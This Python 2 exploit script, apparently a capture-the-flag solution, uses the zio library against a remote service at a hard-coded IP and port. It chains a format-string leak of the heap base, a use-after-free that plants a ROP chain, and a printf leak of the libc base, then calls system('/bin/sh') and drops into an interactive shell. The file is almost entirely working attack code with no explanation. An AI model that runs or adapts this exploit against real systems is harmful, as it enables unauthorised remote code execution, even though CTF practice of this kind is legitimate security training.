from zio import *
target = ('0', 8000)
target = ('119.28.62.216', 10023)
io  = zio((target), print_read = COLORED(REPR, 'red'), print_write = COLORED(REPR, 'blue'), timeout = 10000)

io.hint([0x401fba, 0x401fe3, 0x400d40])

# adr 
plt_printf  = 0x0000000000400be0
p8_ret      = 0x00402336
pop_rdi_ret = 0x00402343
entry       = 0x400d40

# new key

def leak():
    io.wls([1, 1, 11, 13]) 
    # io.wls([2, 0x40, (('AAAAAAAA' +'%{}$lx\x00'.format(0x8b)).ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
    io.wls([2, 0x40, (('AAAAAAAA' +'0x%{}$lx\x00'.format(71)).ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
    
    io.rtl('ciphertext: ')
    io.r(0x40 * 8)
    heap_base = l64(io.rl()[:-1].ljust(0x8, '\x00')) - 0x270
    print '[+] heap base: 0x%x' % heap_base
    
    # free
    io.wls([3, 0x10, '41' * 0x10])
    
    # malloc
    io.wls([4, l64(heap_base + 0x20)])
    
    # rop chain in stack (uaf)
    io.wls([2, 0x20, (l64(pop_rdi_ret) + l64(heap_base + 0x20) + l64(plt_printf) + l64(entry)).ljust(0x20, 'A')])
    
    for i in xrange(4): io.rtl('0x')
    adr_libc_start_main_ret = int(io.rtl('R')[:-1], 16)
    off_libc_start_main_ret = 0x21ec5
    libc_base   = adr_libc_start_main_ret - off_libc_start_main_ret 
    off_system  = 0x00000000000468f0
    adr_system  = libc_base + off_system
    print '[+] libc base : 0x%x' % libc_base
    print '[+] system : 0x%x' % adr_system
    return adr_system

def exp(adr_system):
    # io.wls([2, 0x40, (('AAAAAAAA' +'%{}$lx\x00'.format(0x8b)).ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
    io.wls([1, 1, 11, 13]) 
    io.wls([2, 0x40, (('AAAAAAAA' +'/bin/sh\x00').ljust(0x18, 'a') + l64(p8_ret)).ljust(0x40, 'a')])
    
    io.rtl('ciphertext: ')
    io.r(0x40 * 8)
    heap_base = l64(io.rl()[:-1].ljust(0x8, '\x00')) - 0x270 + 0x450
    print '[+] heap base: 0x%x' % heap_base
    
    io.wls([3, 0x10, '41' * 0x10])
    
    for i in xrange(0x4): io.wls([4, l64(heap_base + 0x20)])
    
    # rop chain in stack
    io.wls([2, 0x20, (l64(pop_rdi_ret) + l64(heap_base + 0x20) + l64(adr_system) + l64(entry)).ljust(0x20, 'A')])
    
exp(leak())
io.itr()
